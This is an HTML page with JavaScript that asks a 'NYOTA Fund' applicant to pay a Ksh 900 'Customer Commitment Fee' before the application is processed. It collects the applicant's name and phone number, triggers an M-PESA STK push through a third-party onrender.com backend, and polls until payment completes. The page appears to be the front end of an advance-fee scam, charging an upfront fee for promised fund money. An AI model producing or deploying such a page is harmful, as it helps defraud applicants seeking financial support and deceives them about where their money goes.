<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Customer Commitment Fee</title>

<style>
body{
    margin:0;
    padding:15px;
    background:#0b6b0b;
    font-family:Arial,sans-serif;
}

.container{
    max-width:420px;
    margin:auto;
}

.card{
    background:white;
    padding:20px;
    border-radius:10px;
}

h1{
    text-align:center;
    color:#1565c0;
    font-size:22px;
}

p{
    text-align:center;
    font-size:15px;
}

label{
    display:block;
    margin-top:15px;
    font-weight:bold;
}

input{
    width:100%;
    padding:12px;
    margin-top:5px;
    border-radius:8px;
    border:1px solid #ccc;
    box-sizing:border-box;
}

button{
    width:100%;
    padding:14px;
    margin-top:20px;
    background:#1565c0;
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
}
</style>
</head>

<body>

<div class="container">
<div class="card">

<h1>Customer Commitment Fee</h1>

<p>Hi 👋 <span id="name"></span>!</p>

<p>Your Selected NYOTA Fund: <b>Ksh <span id="fund"></span></b></p>

<p>Customer Commitment Fee: <b>Ksh 900</b></p>

<p>
Complete your Customer Commitment Fee payment to continue processing your NYOTA Funds application.
</p>

<label>Full Name</label>
<input type="text" id="fullName">

<label>Phone Number</label>
<input type="tel" id="phone" placeholder="2547XXXXXXXX">

<button id="payBtn" onclick="payNow()">
Pay Now
</button>

<p id="stkMessage"></p>

</div>
</div>

<script>

let applicant = localStorage.getItem("applicantName");

document.getElementById("name").innerHTML =
applicant || "Applicant";

document.getElementById("fullName").value =
applicant || "";

document.getElementById("fund").innerHTML =
localStorage.getItem("selectedAmount") || "22,000";

async function payNow(){

let phone = document.getElementById("phone").value;

let btn = document.getElementById("payBtn");

if(phone===""){
alert("Enter phone number");
return;
}

btn.innerHTML = "Sending STK Push...";
btn.disabled = true;

try{

let response = await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body: JSON.stringify({
phone: phone,
amount: 900
})
}
);

let data = await response.json();

console.log(data);

if(!data.success){
    alert(data.message || "Payment failed");
    btn.disabled=false;
    btn.innerHTML="Pay Now";
    return;
}

if(data.status=="completed"){
    window.location.href="success.html";
    return;
}

if(data.status=="pending"){

    btn.innerHTML="Waiting for payment...";

    document.getElementById("stkMessage").innerHTML=
    "STK Push sent. Enter your M-PESA PIN to complete payment.";

    let checkout=data.checkout_request_id;

    let timer=setInterval(async()=>{

        let res=await fetch(
        "https://swiftwallet-backend-k8kn.onrender.com/payment-status",
        {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                checkout_request_id:checkout
            })
        });

        let status=await res.json();

        console.log(status);

        if(status.status=="completed"){

            clearInterval(timer);

            window.location.href="success.html";

        }

        if(status.status=="failed"){

            clearInterval(timer);

            alert("Payment failed");

            btn.disabled=false;
            btn.innerHTML="Pay Now";

        }

    },3000);

}
}
catch(error){

console.log(error);

alert("Payment request failed");

btn.innerHTML = "Pay Now";
btn.disabled = false;

}

}

</script> 

</body>
  </html>
